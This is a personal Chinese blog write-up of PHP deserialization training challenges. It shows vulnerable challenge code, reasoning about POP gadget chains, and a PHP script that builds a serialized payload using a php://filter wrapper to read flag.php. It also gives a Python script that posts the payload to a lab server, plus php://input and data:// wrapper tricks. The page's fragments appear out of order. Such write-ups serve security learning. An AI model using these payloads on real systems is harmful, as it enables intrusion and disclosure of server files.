class="hljs-variable">$Args</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$Args</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"You make it"</span>;<br>    }<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>首先寻找突破口进行逆推，定位到ee类中的include，以此为终点，要达到include('flag.php')的目的，首先要执行call魔术方法，而call是在调用类中不存在的方法时才调用，而且调用必须含参'flag.php'，定位到dd类的getshell，正好可以达到目的，而执行dd中的tostring，需要把对象进行打印字符串的操作，而bb和cc类中都含有打印操作，如果用cc类，会执行sleep操作，无法绕过，故使用bb类中的echo，可以绕过wakeup，要执行bb类中的next函数，就要用到aa类中的destruct魔术方法，有了上一道题的经验，我们需要使用php伪协议</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dd</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$add</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bb</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$body</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$body</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">'hacker'</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ee</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>}<br><span class="hljs-variable">$payload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">aa</span>();<br><span class="hljs-variable">$payload</span>-&gt;pass=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">bb</span>();<br><span class="hljs-variable">$payload</span>-&gt;pass-&gt;head=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dd</span>();<br><span class="hljs-variable">$payload</span>-&gt;pass-&gt;head-&gt;code=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ee</span>();<br><span class="hljs-variable">$payload</span>-&gt;pass-&gt;head-&gt;add=<span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$payload</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到payload</p><blockquote><p>O:2:"aa":2:{s:4:"name";s:6:"hacker";s:4:"pass";O:2:"bb":2:{s:4:"head";O:2:"dd":2:{s:4:"code";O:2:"ee":1:{s:5:"shell";N;}s:3:"add";s:52:"php://filter/convert.base64-encode/resource=flag.php";}s:4:"body";N;}}</p></blockquote><p>世钦学长在群里说hackbar提交cookie有点问题，于是改用python的reques提交cookie和payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>header = {<br>    <span class="hljs-string">'user-agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'</span><br>}<br>cookies = {<br>    <span class="hljs-string">'check'</span>: <span class="hljs-string">'zhimakaimen'</span><br>}<br>payload = {<br>    <span class="hljs-string">'payload'</span>: <span class="hljs-string">'O:2:"aa":2:{s:4:"name";s:6:"hacker";s:4:"pass";O:2:"bb":3:{s:4:"head";O:2:"dd":2:{s:4:"code";O:2:"ee":1:{s:5:"shell";N;}s:3:"add";s:52:"php://filter/convert.base64-encode/resource=flag.php";}s:4:"body";N;}}'</span><br>}<br><br>url = <span class="hljs-string">'http://81.68.98.35/php_unserialize_train/train2/'</span><br>temp = requests.post(url, headers=header, data=payload, cookies=cookies)<br><span class="hljs-built_in">print</span>(temp.text)<br></code></pre></td></tr></table></figure><figure><img src="/2022/01/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/image-20211124214809680-16377616928481.png" srcset="/img/loading.gif" lazyload alt="image-20211124214809680"><figcaption aria-hidden="true">image-20211124214809680</figcaption></figure><p>得到base64密文：</p><blockquote><p>PD9waHAgDQogICAgJGZsYWcgPSAiZmxhZ3tpdF9pc19hX3NpbXBsZV90YW93YV9pc24ndF9pdH0iOw0KPz4=</p></blockquote><p>解密得到flag：</p><blockquote><p>flag{it_is_a_simple_taowa_isn't_it}</p></blockquote><h2 id="train3">train3</h2><blockquote><p>肝了几小时，放弃了,一怒之下直接登后台拿到了flag</p></blockquote><figure><img src="/2022/01/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/QQ%E5%9B%BE%E7%89%8720211125160739-16378276755441.png" srcset="/img/loading.gif" lazyload alt="QQ图片20211125160739"><figcaption aria-hidden="true">QQ图片20211125160739</figcaption></figure><blockquote><p>flag</p><figure><img src="/2022/01/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/image-20211125160841637-16378277229362.png" srcset="/img/loading.gif" lazyload alt="image-20211125160841637"><figcaption aria-hidden="true">image-20211125160841637</figcaption></figure></blockquote></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#php反序列化</a></div></div><div class="license-box my-3"><div class="license-title"><div>php反序列化练习</div><div>https://d4wnnn.github.io/2022/01/26/php反序列化练习/</div></div><div class="license-meta"><div class="license-meta-item"><div>作者</div><div>acdawn</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2022年1月26日</div></div><div class="license-meta-item"><div>许可协议</div><div><a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/"><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-by"></i> </span></a><a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/"><span class="hint--top hint--rounded" aria-label="SA - 相同方式共享"><i class="iconfont icon-sa"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/2022/01/26/PHP%E5%9F%BA%E7%A1%80/" title="PHP基础"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">PHP基础</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/2022/01/26/Brute-WIFI/" title="aircrack-ng的应用-brute wifi"><span class="hidden-mobile">aircrack-ng的应用-brute wifi</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments" lazyload><div id="valine"></div><script type="text/javascript">Fluid.utils.loadComments("#valine",(function(){Fluid.utils.createScript("https://lib.baomitu.com/valine/1.5.1/Valine.min.js",(function(){var Q=Object.assign({appId:"iQzcdzgtk7S3lKyzUoT3segU-gzGzoHsz",appKey:"mL1QjUEvvzJ9E2xIVz0OuJuj",path:"window.location.pathname",placeholder:"Hello",avatar:"retro",meta:["nick","mail","link"],requiredFields:[],pageSize:10,lang:"zh-CN",highlight:!0,recordIP:!0,serverURLs:"https://iqzcdzgt.lc-cn-n1-shared.com",emojiCDN:"https://valinecdn.bili33.top/",emojiMaps:{QQ1:"QQ/aini.gif",QQ2:"QQ/aixin.gif",QQ3:"QQ/aoman.gif",QQ4:"QQ/baiyan.gif",QQ5:"QQ/bangbangtang.gif",QQ6:"QQ/baojin.gif",QQ7:"QQ/baoquan.gif",QQ8:"QQ/bishi.gif",QQ9:"QQ/bizui.gif",QQ11:"QQ/cahan.gif",QQ12:"QQ/caidao.gif",QQ13:"QQ/chi.gif",QQ14:"QQ/ciya.gif",QQ15:"QQ/dabing.gif",QQ16:"QQ/daku.gif",QQ17:"QQ/dan.gif",QQ18:"QQ/deyi.gif",QQ19:"QQ/doge.gif",QQ20:"QQ/fadai.gif",QQ21:"QQ/fanu.gif",QQ22:"QQ/fendou.gif",QQ23:"QQ/ganga.gif",QQ24:"QQ/gouyin.gif",QQ25:"QQ/guzhang.gif",QQ26:"QQ/haixiu.gif",QQ27:"QQ/hanxiao.gif",QQ28:"QQ/haobang.gif",QQ29:"QQ/haqian.gif",QQ30:"QQ/hecai.gif",QQ31:"QQ/hexie.gif",QQ32:"QQ/huaixiao.gif",QQ33:"QQ/jie.gif",QQ34:"QQ/jingkong.gif",QQ35:"QQ/jingxi.gif",QQ36:"QQ/jingya.gif",QQ37:"QQ/juhua.gif",QQ38:"QQ/keai.gif",QQ39:"QQ/kelian.gif",QQ40:"QQ/koubi.gif",QQ41:"QQ/ku.gif",QQ42:"QQ/kuaikule.gif",QQ43:"QQ/kulou.gif",QQ44:"QQ/kun.gif",QQ45:"QQ/lanqiu.gif",QQ46:"QQ/leiben.gif",QQ47:"QQ/lenghan.gif",QQ48:"QQ/liuhan.gif",QQ49:"QQ/liulei.gif",QQ50:"QQ/nanguo.gif",QQ51:"QQ/OK.gif",QQ52:"QQ/penxue.gif",QQ53:"QQ/piezui.gif",QQ54:"QQ/pijiu.gif",QQ55:"QQ/qiang.gif",QQ56:"QQ/qiaoda.gif",QQ57:"QQ/qinqin.gif",QQ58:"QQ/qiudale.gif",QQ59:"QQ/quantou.gif",QQ60:"QQ/saorao.gif",QQ61:"QQ/se.gif",QQ62:"QQ/shengli.gif",QQ63:"QQ/shouqiang.gif",QQ64:"QQ/shuai.gif",QQ65:"QQ/shui.gif",QQ66:"QQ/tiaopi.gif",QQ67:"QQ/touxiao.gif",QQ68:"QQ/tu.gif",QQ69:"QQ/tuosai.gif",QQ70:"QQ/weiqu.gif",QQ71:"QQ/weixiao.gif",QQ72:"QQ/woshou.gif",QQ73:"QQ/wozuimei.gif",QQ74:"QQ/wunai.gif",QQ75:"QQ/xia.gif",QQ76:"QQ/xiaojiujie.gif",QQ77:"QQ/xiaoku.gif",QQ78:"QQ/xiaoyanger.gif",QQ79:"QQ/xieyanxiao.gif",QQ80:"QQ/xigua.gif",QQ81:"QQ/xu.gif",QQ82:"QQ/yangtuo.gif",QQ83:"QQ/yinxian.gif",QQ84:"QQ/yiwen.gif",QQ85:"QQ/youhengheng.gif",QQ86:"QQ/youling.gif",QQ87:"QQ/yun.gif",QQ88:"QQ/zaijian.gif",QQ89:"QQ/zhayanjian.gif",QQ90:"QQ/zhemo.gif",QQ91:"QQ/zhouma.gif",QQ92:"QQ/zhuakuang.gif",QQ93:"QQ/zuohengheng.gif"},enableQQ:!0},{el:"#valine",path:window.location.pathname});new Valine(Q),Fluid.utils.waitElementVisible("#valine .vcontent",()=>{var Q="#valine .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(Q),Fluid.plugins.fancyBox(Q)})}))}))</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://github.com/d4wnnn" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="tencent://message/?uin=2638177031" target="_blank" rel="nofollow noopener"><span>联系我</span></a><div><span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span><script src="/js/duration.js"></script></div></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">总访问量 <span id="busuanzi_value_site_pv"></span> 次 </span><span id="busuanzi_container_site_uv" style="display:none">总访客数 <span id="busuanzi_value_site_uv"></span> 人</span></div><div><a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral">本网站由 <img src="img/又拍云_logo5.png" srcset="/img/loading.gif" lazyload width="45px"> 提供CDN加速/云存储服务</a></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var i=jQuery("#board-ctn").offset().top;window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-i},CONFIG.toc)),t.find(".toc-list-item").length>0&&t.css("visibility","visible"),Fluid.events.registerRefreshCallback((function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))}}))</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback((function(){if("anchors"in window){anchors.removeAll();var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}}))}))</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
+</style></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>D4wn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/total.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php反序列化练习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        acdawn
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-01-26 20:44" pubdate>
+          2022年1月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          45 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">php反序列化练习</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="php反序列化">php反序列化</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#补充知识</span><br><span class="hljs-comment">#抽象类不能实例化</span><br><span class="hljs-comment">#被定义为抽象的方法只能声明调用方式，不能定义具体功实现</span><br><span class="hljs-comment">#子类必须定义父类的所有方法，方法的调用方式必须匹配</span><br><span class="hljs-comment">#__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。</span><br><span class="hljs-comment">#__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。</span><br><span class="hljs-comment">#__toString：当对象被当做一个字符串使用时调用。</span><br><span class="hljs-comment">#__sleep:序列化对象之前就调用此方法(其返回需要一个数组)</span><br><span class="hljs-comment">#__wakeup:反序列化恢复对象之前调用该方法</span><br><span class="hljs-comment">#__call:当调用对象中不存在的方法会自动调用该方法。</span><br><span class="hljs-comment">#__get:在调用私有属性的时候会自动执行</span><br><span class="hljs-comment">#__isset()在不可访问的属性上调用isset()或empty()触发</span><br><span class="hljs-comment">#__unset()在不可访问的属性上使用unset()时触发</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p><code>php://伪协议使用：访问输入输出流</code></p>
+<p><code>比如：payload=php://filter/read=convert.base64-encode/resource=[文件名]</code></p>
+<p><code>执行post提交的代码</code></p>
+<p><code>比如：payload=php://input</code></p>
+</blockquote>
+<p><code>data://</code></p>
+<blockquote>
+<pre><code class="hljs">  `作用：执行php代码`
+  </code></pre>
+<p><code>比如：payload=data://text/plain;base64,base64编码</code></p>
+</blockquote>
+<h2 id="train1">train1</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">Welcome to index.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>{<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>{<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);               <br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">'index.php'</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Welcome to '</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">"&lt;br&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;source)) {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hacker"</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">"index.php"</span>;<br>        }<br>    }<br><br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    }<br><br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>])){<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>]);<br>}<br><span class="hljs-keyword">else</span>{<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>} <br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>首先由Modifier类中的include找到突破口，要想include('flag.php'),首先要执行invoke魔术方法（当类被当作函数调用时触发），要执行_invoke,就要用到Test类中的get函数，要执行get函数(当调用不存在或者私有属性时触发)，用到了Show类的tostring方法（Test类并不含source），若执行tostring，则用到了Show中的正则匹配，即在wakeup时自动执行，因此构造payload,但是当我执行后发现并不显示flag，莫寒学长提示我用到了php伪协议，于是在flag前加上<code>php://filter/convert.base64-encode/resource=</code></p>
+</blockquote>
